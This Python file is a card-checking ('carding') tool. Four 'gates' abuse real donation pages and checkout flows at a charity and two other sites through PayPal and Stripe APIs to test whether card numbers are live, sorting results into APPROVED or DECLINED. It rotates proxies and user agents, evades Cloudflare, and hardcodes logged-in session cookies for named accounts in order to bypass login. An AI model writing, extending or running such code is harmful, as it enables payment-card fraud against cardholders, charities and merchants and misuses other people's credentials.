import requests
import re
import base64
import random
import time
import uuid
import json
import cloudscraper
from requests_toolbelt.multipart.encoder import MultipartEncoder
from user_agent import generate_user_agent

# ============================================================================
# 🛠️ HELPER FUNCTIONS
# ============================================================================

def get_random_ua():
    return generate_user_agent(os=('linux', 'win'))

def format_proxy(proxy):
    """Formats proxy string to dictionary for requests"""
    if not proxy: return None
    try:
        if "http" in proxy: return {"http": proxy, "https": proxy}
        p = proxy.split(':')
        if len(p) == 4:
            url = f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
            return {"http": url, "https": url}
        elif len(p) == 2:
            url = f"http://{p[0]}:{p[1]}"
            return {"http": url, "https": url}
    except: return None
    return None

# ============================================================================
# 🚪 GATE 1: PayPal Commerce (Science)
# 📄 Source: pp.py / pa.py
# ============================================================================

def check_paypal_science(cc, proxy=None):
    try:
        # 1. Parse Card
        cc = cc.strip()
        try:
            n, mm, yy, cvc = cc.split('|')[0], cc.split('|')[1], cc.split('|')[2], cc.split('|')[3]
            if len(yy) == 4: yy = yy[2:]
        except:
            return "❌ Format Error (Use cc|mm|yy|cvv)", "ERROR"
        
        # 2. Setup Session
        session = requests.Session()
        formatted_proxy = format_proxy(proxy)
        if formatted_proxy:
            session.proxies = formatted_proxy
        
        ua = get_random_ua()
        
        # 3. Get Tokens (Page Load)
        headers = {'user-agent': ua}
        try:
            r1 = session.get('https://scienceforthechurch.org/donate/', headers=headers, timeout=20)
        except requests.exceptions.ProxyError:
            return "❌ Proxy Dead", "ERROR"
        except requests.exceptions.ConnectionError:
            return "❌ Connection Error", "ERROR"
            
        try:
            id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', r1.text).group(1)
            id_form2 = re.search(r'name="give-form-id" value="(.*?)"', r1.text).group(1)
            nonec = re.search(r'name="give-form-hash" value="(.*?)"', r1.text).group(1)
            enc = re.search(r'"data-client-token":"(.*?)"', r1.text).group(1)
            dec = base64.b64decode(enc).decode('utf-8')
            au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
        except AttributeError:
            return "❌ Scrape Error (Site Changed/Blocked)", "ERROR"

        # 4. Define Payload Data (Dictionary)
        # We define this here so we can create FRESH encoders for each request
        payload_data = {
            'give-form-id': id_form2,
            'give-form-hash': nonec,
            'give-price-id': '3',
            'give-amount': '1.00',
            'give_first': 'Test',
            'give_last': 'User',
            'give_email': f'test{uuid.uuid4().hex[:8]}@gmail.com',
            'give-gateway': 'paypal-commerce'
        }

        # 5. Create Order (WP-Ajax)
        headers = {
            'origin': 'https://scienceforthechurch.org',
            'referer': 'https://scienceforthechurch.org/donate/',
            'user-agent': ua,
            'x-requested-with': 'XMLHttpRequest',
        }
        
        # FRESH ENCODER #1
        mp_data_1 = MultipartEncoder(fields=payload_data)
        headers['content-type'] = mp_data_1.content_type
        
        r2 = session.post(
            'https://scienceforthechurch.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order', 
            headers=headers, 
            data=mp_data_1, 
            timeout=20
        )
        
        try:
            tok = r2.json()['data']['id']
        except:
            return "❌ Order Creation Failed", "DECLINED"

        # 6. Confirm Payment Source (PayPal API)
        headers_pp = {
            'authorization': f'Bearer {au}',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'user-agent': ua
        }
        json_data = {
            'payment_source': {
                'card': {
                    'number': n,
                    'expiry': f'20{yy}-{mm}',
                    'security_code': cvc
                }
            }
        }
        session.post(
            f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source', 
            headers=headers_pp, 
            json=json_data, 
            timeout=20
        )

        # 7. Approve Order (WP-Ajax)
        # FRESH ENCODER #2 (Critical for Mass Check stability)
        mp_data_2 = MultipartEncoder(fields=payload_data)
        headers['content-type'] = mp_data_2.content_type
        
        r4 = session.post(
            f'https://scienceforthechurch.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_approve_order&order={tok}', 
            headers=headers, 
            data=mp_data_2, 
            timeout=20
        )
        
        text = r4.text
        
        # 8. Logic
        if 'true' in text or 'success' in text: return "Charged $1.00", "APPROVED"
        elif 'INSUFFICIENT_FUNDS' in text: return "Insufficient Funds", "APPROVED"
        elif 'CVV2_FAILURE' in text: return "CCN Live (CVV Failed)", "APPROVED"
        elif 'DO_NOT_HONOR' in text: return "Do Not Honor", "DECLINED"
        elif 'PICKUP_CARD' in text: return "Pickup Card", "DECLINED"
        elif 'STOLEN' in text: return "Stolen Card", "DECLINED"
        elif 'INVALID_ACCOUNT' in text: return "Invalid Account", "DECLINED"
        else: return "Declined (Generic)", "DECLINED"

    except Exception as e:
        return f"Error: {str(e)}", "ERROR"

# ============================================================================
# 🚪 GATE 2: PayPal Commerce (SFTS)
# 📄 Source: paypalcvv.py
# ============================================================================

def check_paypal_sfts(cc, proxy=None):
    try:
        # 1. Parse Card
        cc = cc.strip()
        parts = cc.split('|')
        n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]
        
        if "20" in yy and len(yy) == 4: 
            yy = yy.split("20")[1]
        
        # 2. Setup Session
        r = requests.Session()
        if proxy:
            r.proxies = format_proxy(proxy)
        
        user = generate_user_agent()
        headers_init = {'user-agent': user}
        
        # 3. Initial Request to Get Tokens
        response = r.get('https://sfts.org.uk/donate/', headers=headers_init)
        
        id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text).group(1)
        id_form2 = re.search(r'name="give-form-id" value="(.*?)"', response.text).group(1)
        nonec = re.search(r'name="give-form-hash" value="(.*?)"', response.text).group(1)
        
        enc = re.search(r'"data-client-token":"(.*?)"', response.text).group(1)
        dec = base64.b64decode(enc).decode('utf-8')
        au = re.search(r'"accessToken":"(.*?)"', dec).group(1)

        # 4. AJAX Donation Process
        headers = {
            'origin': 'https://sfts.org.uk',
            'referer': 'https://sfts.org.uk/donate/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': user,
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = {
            'give-honeypot': '',
            'give-form-id-prefix': id_form1,
            'give-form-id': id_form2,
            'give-form-title': '',
            'give-current-url': 'https://sfts.org.uk/donate/',
            'give-form-url': 'https://sfts.org.uk/donate/',
            'give-form-minimum': '1.00',
            'give-form-maximum': '999999.99',
            'give-form-hash': nonec,
            'give-price-id': '3',
            'give-recurring-logged-in-only': '',
            'give-logged-in-only': '1',
            '_give_is_donation_recurring': '0',
            'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
            'give-amount': '1.00',
            'give_stripe_payment_method': '',
            'payment-mode': 'paypal-commerce',
            'give_first': 'DRGAM',
            'give_last': 'rights and',
            'give_email': 'drgam22@gmail.com',
            'card_name': 'drgam ',
            'card_exp_month': '',
            'card_exp_year': '',
            'give_action': 'purchase',
            'give-gateway': 'paypal-commerce',
            'action': 'give_process_donation',
            'give_ajax': 'true',
        }
        
        r.post('https://sfts.org.uk/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)

        # 5. Create Order Request
        # Define fields first so we can reuse the dictionary, not the encoder
        fields_dict = {
            'give-honeypot': '',
            'give-form-id-prefix': id_form1,
            'give-form-id': id_form2,
            'give-form-title': '',
            'give-current-url': 'https://sfts.org.uk/donate/',
            'give-form-url': 'https://sfts.org.uk/donate/',
            'give-form-minimum': '1.00',
            'give-form-maximum': '999999.99',
            'give-form-hash': nonec,
            'give-price-id': '3',
            'give-recurring-logged-in-only': '',
            'give-logged-in-only': '1',
            '_give_is_donation_recurring': '0',
            'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
            'give-amount': '1.00',
            'give_stripe_payment_method': '',
            'payment-mode': 'paypal-commerce',
            'give_first': 'DRGAM',
            'give_last': 'rights and',
            'give_email': 'drgam22@gmail.com',
            'card_name': 'drgam ',
            'card_exp_month': '',
            'card_exp_year': '',
            'give-gateway': 'paypal-commerce',
        }

        multipart_data = MultipartEncoder(fields=fields_dict)
        
        # Update headers with correct Content-Type for Multipart
        headers.update({'content-type': multipart_data.content_type})
        
        params = {'action': 'give_paypal_commerce_create_order'}
        response = r.post(
            'https://sfts.org.uk/wp-admin/admin-ajax.php',
            params=params,
            cookies=r.cookies,
            headers=headers,
            data=multipart_data
        )
        
        tok = response.json()['data']['id']
        
        # 6. PayPal Confirm Payment Source
        pp_headers = {
            'authority': 'cors.api.paypal.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en-US;q=0.7,en;q=0.6',
            'authorization': f'Bearer {au}',
            'braintree-sdk-version': '3.32.0-payments-sdk-dev',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'paypal-client-metadata-id': '7d9928a1f3f1fbc240cfd71a3eefe835',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': user,
        }
        
        json_data = {
            'payment_source': {
                'card': {
                    'number': n,
                    'expiry': f'20{yy}-{mm}',
                    'security_code': cvc,
                    'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
                },
            },
            'application_context': {'vault': False},
        }
        
        r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source', headers=pp_headers, json=json_data)

        # 7. Final Approve Order
        # IMPORTANT: Create a NEW MultipartEncoder because the previous one is exhausted
        multipart_data_approve = MultipartEncoder(fields=fields_dict)
        
        # Update headers again for the new boundary
        headers.update({'content-type': multipart_data_approve.content_type})

        params_approve = {
            'action': 'give_paypal_commerce_approve_order',
            'order': tok,
        }
        
        response = r.post(
            'https://sfts.org.uk/wp-admin/admin-ajax.php',
            params=params_approve,
            cookies=r.cookies,
            headers=headers,
            data=multipart_data_approve
        )
        
        # 8. Result Handling
        text = response.text
        if 'true' in text or 'sucsess' in text: return "Charge !", "APPROVED"
        elif 'DO_NOT_HONOR' in text: return "Do not honor", "DECLINED"
        elif 'ACCOUNT_CLOSED' in text: return "Account closed", "DECLINED"
        elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text: return "Account closed", "DECLINED"
        elif 'LOST_OR_STOLEN' in text: return "LOST OR STOLEN", "DECLINED"
        elif 'CVV2_FAILURE' in text: return "Card Issuer Declined CVV", "APPROVED"
        elif 'SUSPECTED_FRAUD' in text: return "SUSPECTED FRAUD", "DECLINED"
        elif 'INVALID_ACCOUNT' in text: return 'INVALID_ACCOUNT', "DECLINED"
        elif 'REATTEMPT_NOT_PERMITTED' in text: return "REATTEMPT NOT PERMITTED", "DECLINED"
        elif 'ACCOUNT BLOCKED BY ISSUER' in text: return "ACCOUNT_BLOCKED_BY_ISSUER", "DECLINED"
        elif 'ORDER_NOT_APPROVED' in text: return 'ORDER_NOT_APPROVED', "DECLINED"
        elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text: return 'PICKUP_CARD_SPECIAL_CONDITIONS', "DECLINED"
        elif 'PAYER_CANNOT_PAY' in text: return "PAYER CANNOT PAY", "DECLINED"
        elif 'INSUFFICIENT_FUNDS' in text: return 'Insufficient Funds', "APPROVED"
        elif 'GENERIC_DECLINE' in text: return 'GENERIC_DECLINE', "DECLINED"
        elif 'COMPLIANCE_VIOLATION' in text: return "COMPLIANCE VIOLATION", "DECLINED"
        elif 'TRANSACTION_NOT PERMITTED' in text: return "TRANSACTION NOT PERMITTED", "DECLINED"
        elif 'PAYMENT_DENIED' in text: return 'PAYMENT_DENIED', "DECLINED"
        elif 'INVALID_TRANSACTION' in text: return "INVALID TRANSACTION", "DECLINED"
        elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text: return "RESTRICTED OR INACTIVE ACCOUNT", "DECLINED"
        elif 'SECURITY_VIOLATION' in text: return 'SECURITY_VIOLATION', "DECLINED"
        elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in text: return "DECLINED DUE TO UPDATED ACCOUNT", "DECLINED"
        elif 'INVALID_OR_RESTRICTED_CARD' in text: return "INVALID CARD", "DECLINED"
        elif 'EXPIRED_CARD' in text: return "EXPIRED CARD", "DECLINED"
        elif 'CRYPTOGRAPHIC_FAILURE' in text: return "CRYPTOGRAPHIC FAILURE", "DECLINED"
        elif 'TRANSACTION_CANNOT_BE_COMPLETED' in text: return "TRANSACTION CANNOT BE COMPLETED", "DECLINED"
        elif 'DECLINED_PLEASE_RETRY' in text: return "DECLINED PLEASE RETRY LATER", "DECLINED"
        elif 'TX_ATTEMPTS_EXCEED_LIMIT' in text: return "EXCEED LIMIT", "DECLINED"
        else:
            try:
                return response.json()['data']['error'], "DECLINED"
            except:
                return "UNKNOWN_ERROR", "ERROR"

    except Exception as e:
        return f"Process Error: {str(e)}", "ERROR"
# ============================================================================
# 🚪 GATE 3: Stripe Auth (Associations)
# 📄 Source: checker.py
# ============================================================================

# Account Pool from checker.py (ESSENTIAL FOR BYPASSING LOGIN)
ACCOUNT_POOL = [
    {
        'name': 'Xray Xlea',
        'cookies': {
            '_ga': 'GA1.2.493930677.1768140612',
            '__stripe_mid': '66285028-f520-443b-9655-daf7134b8b855e5f16',
            'wordpress_logged_in_9f53720c758e9816a2dcc8ca08e321a9': 'xrayxlea%7C1769350388%7CxGcUPPOJgEHPSWiTK6F9YZpA6v4AgHki1B2Hxp0Zah5%7C3b8f3e6911e25ea6cccc48a4a0be35ed25e0479c9e90ccd2f16aa41cac04277d',
            'wfwaf-authcookie-69aad1faf32f3793e60643cdfdc85e58': '7670%7Cother%7Cread%7Cb723e85c048d2147e793e6640d861ae4f4fddd513abc1315f99355cf7d2bc455',
            '__cf_bm': 'rd1MFUeDPNtBzTZMChisPSRIJpZKLlo5dgif0o.e_Xw-1769258154-1.0.1.1-zhaKFI8L0JrFcuTzj.N9OkQvBuz6HvNmFFKCSqfn_gE2EF3GD65KuZoLGPuEhRyVwkKakMr_mcjUehEY1mO9Kb9PKq1x5XN41eXwXQavNyk',
            '__stripe_sid': '4f84200c-3b60-4204-bbe8-adc3286adebca426c8',
        }
    },
    {
        'name': 'Yasin Akbulut',
        'cookies': {
            '__cf_bm': 'zMehglRiFuX3lzj170gpYo3waDHipSMK0DXxfB63wlk-1769340288-1.0.1.1-ppt5LELQNDnJzFl1hN13LWwuQx5ZFdMS9b0SP4A3j7kasxaqEBMgSJ3vu9AbzyFOlbCozpAr.hE.g3xFpU_juaLp1heupyxmSrmte1Gn7g0',
            'wordpress_logged_in_9f53720c758e9816a2dcc8ca08e321a9': 'akbulutyasin836%7C1770549977%7CwdF5vz1qFXPSxofozNx9OwxFdmIoSdQKxaHlkOkjL2o%7C4d5f40c1bf01e0ccd6a59fdf08eb8f5aeb609c05d4d19fe41419a82433ffc1fa',
            '__stripe_mid': '2d2e501a-542d-4635-98ec-e9b2ebe26b4c9ac02a',
            '__stripe_sid': 'b2c6855b-7d29-4675-8fe4-b5c4797045132b8dea',
            'wfwaf-authcookie-69aad1faf32f3793e60643cdfdc85e58': '8214%7Cother%7Cread%7Cde5fd05c6afc735d5df323de21ff23f598bb5e1893cb9a7de451b7a8d50dc782',
        }
    },
    {
        'name': 'Mehmet Demir',
        'cookies': {
            '__cf_bm': 'zMehglRiFuX3lzj170gpYo3waDHipSMK0DXxfB63wlk-1769340288-1.0.1.1-ppt5LELQNDnJzFl1hN13LWwuQx5ZFdMS9b0SP4A3j7kasxaqEBMgSJ3vu9AbzyFOlbCozpAr.hE.g3xFpU_juaLp1heupyxmSrmte1Gn7g0',
            'wordpress_logged_in_9f53720c758e9816a2dcc8ca08e321a9': 'akbulutyasin836%7C1770549977%7CwdF5vz1qFXPSxofozNx9OwxFdmIoSdQKxaHlkOkjL2o%7C4d5f40c1bf01e0ccd6a59fdf08eb8f5aeb609c05d4d19fe41419a82433ffc1fa',
            '__stripe_mid': '2d2e501a-542d-4635-98ec-e9b2ebe26b4c9ac02a',
            '__stripe_sid': 'b2c6855b-7d29-4675-8fe4-b5c4797045132b8dea',
            'sbjs_migrations': '1418474375998%3D1',
        }
    },
    {
        'name': 'Ahmet Aksoy',
        'cookies': {
            '__cf_bm': 'aidh4Te7pipYMK.tLzhoGhXGelOgYCnYQJ525DEIqNM-1769341631-1.0.1.1-HSRHKAbOct2k1bbWIIdIN7b5fzWFydAtRqz2W0pAdRXrbVusNthJCJvU5fc7d3RkZEOZ5ZXZghJ4J2jmYzIcdJGDbb90txn4HPgSKJ6neA8',
            '_ga': 'GA1.2.1596026899.1769341671',
            '_gid': 'GA1.2.776441.1769341671',
            '__stripe_mid': '1b0100cd-503c-4665-b43b-3f5eb8b4edcdaae8bd',
            '__stripe_sid': '0f1ce17f-f7a9-4d26-bd37-52d402d30d1a8716bf',
            'wordpress_logged_in_9f53720c758e9816a2dcc8ca08e321a9': 'ahmetaksoy2345%7C1770551236%7CGF3svY4oh1UiTMXJ9iUXXuXtimHSG6PHiW0Sm5wrDbt%7Ce810ede4e1743cd73dc8dacdd56598ecf4ceaa383052d9b50d1bbd6c02da7237',
            'wfwaf-authcookie-69aad1faf32f3793e60643cdfdc85e58': '8216%7Cother%7Cread%7C70f37e1a77141c049acd75715a8d1aef6d47b285656c907c79392a55e787d97e',
        }
    },
    {
        'name': 'Dlallah',
        'cookies': {
            '__cf_bm': 'nwW.aCdcJXW8SAKZYpmEuqU6gCsNM1ibgP9mNKqXuYw-1769341811-1.0.1.1-hkeF4QihuQfbJD7DRqQcILcMycgxTqxxHcqwsU6oR8WsdViGcVMbX0CHqmx76N8wUEuIQwLFooNTm2gjGrRCKlURh4vf1ghD3gkz18KjyWg',
            '__stripe_mid': 'c7368749-b4fc-4876-bb97-bc07cc8a36b5851848',
            '__stripe_sid': 'b9d4dfb2-bba4-4ee6-9c72-8acf6acfe138efd65d',
            '_ga': 'GA1.2.1162515809.1769341851',
            'wordpress_logged_in_9f53720c758e9816a2dcc8ca08e321a9': 'dlallah%7C1770551422%7CiMfIpOcXTEo2Y9rmVMf3Mpf0kpkC4An81IgT0ZfMLff%7C01fbc5549954aa84d4f1b6c62bc44ebe65df58be0b82014d1b246c220d361231',
            'wfwaf-authcookie-69aad1faf32f3793e60643cdfdc85e58': '8217%7Cother%7Cread%7C24531823e5d32b0ad918bef860997fced3f0b92cce7ba200e3a753e050b546d3',
        }
    }
]

ULTRA_HEADERS = {
    'authority': 'associationsmanagement.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'accept-language': 'en-US,en;q=0.9',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}

def check_stripe_associations(cc, proxy=None):
    try:
        # 1. Parse Card
        cc = cc.strip()
        n, mm, yy, cvc = cc.split('|')
        yy = f"20{yy[-2:]}" if len(yy) <= 2 else yy
        
        # 2. Select Account and Setup Scraper
        acc = random.choice(ACCOUNT_POOL)
        scraper = cloudscraper.create_scraper(browser={'browser': 'chrome', 'platform': 'android', 'mobile': True})
        
        if proxy:
            p_dict = format_proxy(proxy)
            scraper.proxies.update(p_dict)
        
        scraper.cookies.update(acc['cookies'])
        scraper.headers.update(ULTRA_HEADERS)

        # 1. Page Connect
        r_page = scraper.get("https://associationsmanagement.com/my-account/add-payment-method/", timeout=25)
        pk_live = re.search(r'pk_live_[a-zA-Z0-9]+', r_page.text).group(0)
        addnonce = re.search(r'"createAndConfirmSetupIntentNonce":"([a-z0-9]+)"', r_page.text).group(1)

        time.sleep(random.uniform(2.5, 3.5))

        #
        stripe_hd = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': ULTRA_HEADERS['user-agent'],
        }

        #
        stripe_payload = (
            f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}'
            f'&billing_details[name]={acc["name"].replace(" ", "+")}'
            f'&billing_details[address][postal_code]=10001'
            f'&key={pk_live}'
            f'&muid={acc["cookies"].get("__stripe_mid", str(uuid.uuid4()))}'
            f'&sid={acc["cookies"].get("__stripe_sid", str(uuid.uuid4()))}'
            f'&guid={str(uuid.uuid4())}'
            f'&payment_user_agent=stripe.js%2F8f77e26090%3B+stripe-js-v3%2F8f77e26090%3B+checkout'
            f'&time_on_page={random.randint(90000, 150000)}'
        )

        r_stripe_req = scraper.post('https://api.stripe.com/v1/payment_methods', headers=stripe_hd, data=stripe_payload)
        r_stripe = r_stripe_req.json()

        if 'id' not in r_stripe:
            err = r_stripe.get('error', {}).get('message', 'Radar Security Block')
            return f"Declined -> {err}", "DECLINED"
            
        # 3. Final Ajax
        ajax_data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': r_stripe['id'],
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': addnonce,
        }
        r_ajax = scraper.post('https://associationsmanagement.com/wp-admin/admin-ajax.php', data=ajax_data, timeout=20).text
        text = r_ajax.lower()

        # 6. Final Logic from checker.py
        if '"success":true' in text: return "Approved (Auth)", "APPROVED"
        if 'insufficient_funds' in text: return "Insufficient Funds", "APPROVED"
        if 'incorrect_cvc' in text: return "CCN Live (CVC Incorrect)", "APPROVED"
        if 'security code' in text: return "CCN Live (Security Code)", "APPROVED"
        
        # Parse Decline Reason
        try:
            reason = re.search(r'message\":\"(.*?)\"', r_ajax)
            reason_txt = reason.group(1) if reason else 'Rejected'
            return f"Declined ({reason_txt})", "DECLINED"
        except:
            return "Declined", "DECLINED"

    except Exception as e:
        return f"Error: {str(e)}", "ERROR"


# ============================================================================
# 🚪 GATE 4: HostArmada (Stripe)
# 📄 Source: $tripeauth.py
# ============================================================================

def check_stripe_hostarmada(cc, proxy=None):
    try:
        # 1. Parse Card
        cc = cc.strip()
        n, mm, yy, cvc = cc.split('|')[0], cc.split('|')[1], cc.split('|')[2], cc.split('|')[3]
        if len(yy) == 2: yy = "20" + yy

        session = requests.Session()
        session.proxies = format_proxy(proxy)
        
        # Cookies from $tripeauth.py
        cookies = {
    'WHMCSy551iLvnhYt7': '8ca8a4c665c9ec28eab1f8221ad4101d',
    '_fbp': 'fb.1.1769757795735.772366065144413707',
    '__zlcmid': '1VroFkzAJVG59We',
    '__stripe_mid': '5330d896-1e8d-4606-a930-c28209c4f3e148b5e0',
    '__stripe_sid': '8fc0309c-0967-4bc6-b6ad-962a97b2ff618f802f',
    'ph_phc_V4kxp7RWacpQcqkBu4PN1BicIOKeaoGNi9dRyIo0IEm_posthog': '%7B%22%24device_id%22%3A%22019c0dc8-e4b9-7bdc-9a0e-9c1e067e64c5%22%2C%22distinct_id%22%3A%22019c0dc8-e4b9-7bdc-9a0e-9c1e067e64c5%22%2C%22%24sesid%22%3A%5B1769758005700%2C%22019c0dc8-e4d0-74c1-b7c1-be1502450835%22%2C1769757795531%5D%2C%22%24initial_person_info%22%3A%7B%22r%22%3A%22%24direct%22%2C%22u%22%3A%22https%3A%2F%2Fmy.hostarmada.com%2Fclientarea.php%22%7D%7D',
}

        
        # Headers from $tripeauth.py
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}

        # 2. Create Payment Method (Stripe API)
        # Using hardcoded PK and specific GUID/MUID from file
        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=b7547fec-aaeb-43cf-86ac-2d11a91f66ed6e4605&muid=5330d896-1e8d-4606-a930-c28209c4f3e148b5e0&sid=8fc0309c-0967-4bc6-b6ad-962a97b2ff618f802f&pasted_fields=number&payment_user_agent=stripe.js%2Fa10732936b%3B+stripe-js-v3%2Fa10732936b%3B+split-card-element&referrer=https%3A%2F%2Fmy.hostarmada.com&time_on_page=31195&key=pk_live_sZwZsvPzNPvgqldQYmY5QWhE00B8Wlf3Tx'
        
        r1 = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=15)
        
        try:
            id_tok = r1.json()['id']
        except:
            return "❌ Token Error", "ERROR"

        # 3. HostArmada Checkout
        headers2 = {
        'authority': 'my.hostarmada.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://my.hostarmada.com',
        'referer': 'https://my.hostarmada.com/cart.php?a=checkout',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
        # Randomize User Info
        rnd = random.randint(1000,9999)
        data2 = {
        'token': '5657f42085350cb956addb77da8cea663100c2ab',
        'submit': 'true',
        'custtype': 'new',
        'loginemail': '',
        'loginpassword': '',
        'firstname': 'Tommy',
        'lastname': 'K2itm',
        'email': 'Tommy@gmail.com',
        'phonenumber': '315401313',
        'password': 'Pedro1234',
        'password2': 'Pedro1234',
        'country': 'US',
        'state': 'New York',
        'address1': '402 California Avenue',
        'address2': 'suite 2910',
        'city': 'Bakersfield',
        'companyname': 'Enzo',
        'postcode': '10080',
        'paymentmethod': 'stripe',
        'accordion-2': 'on',
        'ccinfo': 'new',
        'validatepromo': '0',
        'promocode': '',
        'accepttos': 'on',
        'payment_method_id': id,
    }

        r2 = session.post('https://my.hostarmada.com/index.php?rp=/stripe/payment/intent', 
                          cookies=cookies, headers=headers2, data=data2, timeout=30)
        
        result = r2.json()
        
        # 4. Result Logic from $tripeauth.py
        if 'warning' in result:
             warning = result['warning']
             if "Insufficient" in warning: return "Insufficient Funds", "APPROVED"
             if "security code" in warning: return "CCN Live (Security Code)", "APPROVED"
             return f"Declined ({warning})", "DECLINED"
        
        if 'success' in str(result):
            return "Approved (Auth)", "APPROVED"
            
        return "Declined", "DECLINED"

    except Exception as e:
        return f"Error: {str(e)}", "ERROR"